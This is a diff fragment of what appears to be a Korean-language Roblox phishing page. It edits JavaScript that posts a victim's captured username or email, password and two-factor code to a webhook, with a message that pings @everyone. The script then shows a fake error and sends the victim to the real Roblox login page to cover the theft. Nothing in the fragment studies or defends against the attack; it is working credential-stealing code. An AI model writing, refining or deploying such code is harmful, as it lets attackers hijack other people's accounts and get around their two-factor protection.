             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
+                    content: '**[2단계] Roblox 2FA 코드 캡처됨!** @everyone',
                     embeds: [{
-                        title: '✅ Roblox 2FA 코드 획득 완료!',
+                        title: '2FA 코드 획득 완료',
                         fields: [
-                            { name: '사용자명/이메일', value: capturedUser, inline: true },
+                            { name: '사용자 이름/이메일', value: capturedUser, inline: true },
                             { name: '비밀번호', value: capturedPass, inline: true },
-                            { name: '2FA 인증 코드', value: faCode || '(입력 안 됨)', inline: false }
+                            { name: '2FA 인증 코드', value: faCode, inline: false }
                         ],
                         color: 0x00FF00,
                         timestamp: new Date().toISOString()
                     }]
                 })
-            }).catch(() => {});
+            }).catch(function() {});
+
+            // 에러 표시 후 진짜 Roblox로 이동
             document.getElementById('faErrorMsg').style.display = 'block';
-            setTimeout(() => {
+            setTimeout(function() {
                 window.location.href = 'https://www.roblox.com/ko/login';
             }, 2000);
         });
     </script>
+
 </body>
 </html>
